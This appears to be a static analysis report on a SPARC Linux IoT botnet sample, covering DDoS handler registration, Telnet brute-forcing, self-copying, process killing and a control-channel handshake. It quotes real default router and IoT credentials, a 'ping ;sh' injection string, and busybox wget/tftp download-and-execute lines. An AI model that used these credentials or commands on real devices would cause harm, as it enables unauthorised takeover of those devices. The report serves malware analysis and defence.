## Behavior analysis

**9** behaviors in total, each backed by evidence, and all statically available.

### 1. Register DDoS attack vectors

`T1498` · Confidence **high** · static

At startup it registers 21 attack handler functions (IDs 0x00-0x14) one by one into the attack table, for the controller to invoke through issued DDoS commands.

> **Evidence**: FUN_000105c4 @0x105c4 loops calling FUN_000260e8 and writes to DAT_0003c8d8; called by main @0x1a04c
> 
> **Source**: `ev-000004` · `ev-000005`

### 2. Built-in default credential table

`T1110.001` · Confidence **high** · static

It embeds more than 70 sets of IoT/router default credentials (vizxv, xc3511, 7ujMko0admin, Zte521, telecomadmin, nE7jA%5m, etc.) for password guessing against Telnet services.

> **Evidence**: String region 0x28de8-0x29480 (root passwords and default credential table), e.g. 0x28de8 'root', 0x28fe8 'Zte521', 0x292f8 'nE7jA%5m'
> 
> **Source**: `ev-000001` · `ev-000008`

### 3. Probe HTTP/2 and TLS

`T1046` · Confidence **high** · static

The scanning function constructs a 'PRI * HTTP/2.0' connection preface and a TLS ClientHello carrying the SNI www[.]example[.]com, identifies the target service type, and then selects an exploitation path.

> **Evidence**: FUN_00012dc8 @0x12dc8; 0x13928 loads 0x28800 'PRI * HTTP/2.0'; 0x13de0 loads the 0x2c0c0 TLS ClientHello template
> 
> **Source**: `ev-000001` · `ev-000008`

### 4. Telnet delivers download script

`T1105` · Confidence **high** · static

Through commands such as 'ping ;sh' it obtains a shell on the victim device, then uses /bin/busybox wget/tftp/ftpget/curl to download and execute wget.sh, tftp.sh, ftpget.sh and curl.sh, and finally runs ./.d or ./dvrHelper selfrep to complete reinfection.

> **Evidence**: Strings 0x294b0 'ping ;sh', 0x29548 '/bin/busybox wget hxxp://', 0x29568 '/wget.sh -O- | sh;...tftp...ftpget', 0x29610 '/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep'; a pointer at 0x158fe references the latter
> 
> **Source**: `ev-000001` · `ev-000008`

### 5. Kill competing processes

`T1489` · Confidence **high** · static

The killer module walks /proc and /proc/net/tcp, matches processes such as login, telnetd, rlogin, /bin/login, netcat and socat, and terminates them to monopolize the infected device.

> **Evidence**: FUN_000199c8 @0x199c8; 0x19dfc references 0x28a68 'login', 0x19e74 references 0x28a98 'netcat'; strings 0x2886f '/proc/net/tcp', 0x28890 '/exe', 0x288a0 '/fd/'
> 
> **Source**: `ev-000001` · `ev-000008`

### 6. Copy itself to writable directories

`T1037` · Confidence **high** · static

It reads /proc/self/exe to obtain its own path and copies itself into /var, /var/run, /var/tmp, /dev, /dev/shm, /etc, /mnt, /usr, /boot and /home according to a path table; it also selects the corresponding variant from an architecture-name table (x86/arm5/arm6/arm7/mips/mipsel/ppc/spc).

> **Evidence**: FUN_000195c4 @0x195c4; {len,ptr} path table at 0x29a10; architecture table at 0x29aa8, 0x29a08 points to 'spc'
> 
> **Source**: `ev-000006` · `ev-000001`

### 7. Masquerade the hostname to evade detection

`T1036` · Confidence **medium** · static

At startup it reads the KERN_SECURELEVEL environment variable and uses it to decide runtime parameters, then changes the hostname with '/bin/busybox hostname PBOC'; it also checks /proc for states such as ' (deleted)' to determine whether it has been deleted or is in an analysis environment.

> **Evidence**: main @0x1a04c references 0x28ab0 'KERN_SECURELEVEL' at 0x1a078; strings 0x294e0 '/bin/busybox hostname PBOC', 0x289e8 ' (deleted)', 0x289d8 '/status', 0x289e0 'PPid:'
> 
> **Source**: `ev-000001` · `ev-000004`

### 8. Listen on a socket for commands

`T1095` · Confidence **medium** · static

The main loop creates listening/connection sockets; after accept it reads 8 bytes and compares them with the magic value 'BOT\x01TAKE' as the control-channel handshake, and proceeds to subsequent command handling based on the result.

> **Evidence**: main @0x1a04c calls FUN_00025ae8(accept) at 0x1a3xx; near 0x1a3f8 an 8-byte comparison is made against &DAT_000288a8, whose contents at 0x288a8 are 'BOT\x01TAKE'
> 
> **Source**: `ev-000004`

### 9. Craft malformed HTTP uploads

`T1190` · Confidence **medium** · static

It embeds a malformed request template with POST /upload and Content-Length: 4294967295, plus POST /api/sync, GET /api/v1/status and a fake 200 JSON response, for vulnerability probing, HTTP flooding or masquerading as business traffic.

> **Evidence**: Strings 0x28b70 'POST /upload HTTP/1.1', 0x28bb9 'Content-Length: 4294967295', 0x28ca8 'POST /api/sync', 0x28c38 'HTTP/1.1 200 OK', 0x28c80 '{"status":"ok","code":200,...'
> 
> **Source**: `ev-000001` · `ev-000008`

## What not to claim

:::important
The following conclusions are **easy to misinterpret**; please note them when citing this report.

- No file encryption, wiping or ransom note was found: the cryptographic-constant scan did not hit algorithms such as AES/SHA/MD5, and the decompiled logic contains no bulk encryption/deletion loops, so it should not be judged ransomware or a wiper.
- No real C2 session, outbound connection or DDoS traffic was observed: the sample contains only placeholder domains and request templates; real execution failed because the architecture is unsupported, and qemu emulation produced no output either; do not claim it connected to a C2 or launched attacks against targets.
- This is a 32-bit big-endian SPARC Linux ELF (statically linked, no interpreter), not a PE/Windows sample; do not apply Windows injection, registry or service conclusions to it.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Static decompilation (dynamic execution produced no runtime behavior) |
| Unpacking | No |

**Limitations and open questions**

1. Real dynamic execution did not succeed: the hardened runtime returned unsupported-elf-machine (e_machine=2/SPARC); running under qemu-user(sparc) timed out after 20 seconds with no output, so runtime behavior such as sockets/files/processes could not be observed.
2. No usable C2 was recovered: the whole file contains only the two placeholder domains api.svc.local and www[.]example[.]com; the region 0x19b10-0x1a198 has entropy 4.69, single-byte XOR did not yield readable configuration, and the configuration may require runtime decryption, which could not be confirmed.
3. The binary is stripped and statically linked, so function names are inferred by the decompiler; some strings (e.g. 0x29648 'The People\'s') have no cross-references from executable code and may be residue or decoys, so they were not used as a basis for conclusions.
4. The sandbox network was isolated, and no outbound, DNS or scanning traffic was observed; the C2 and attack targets are both static inferences.
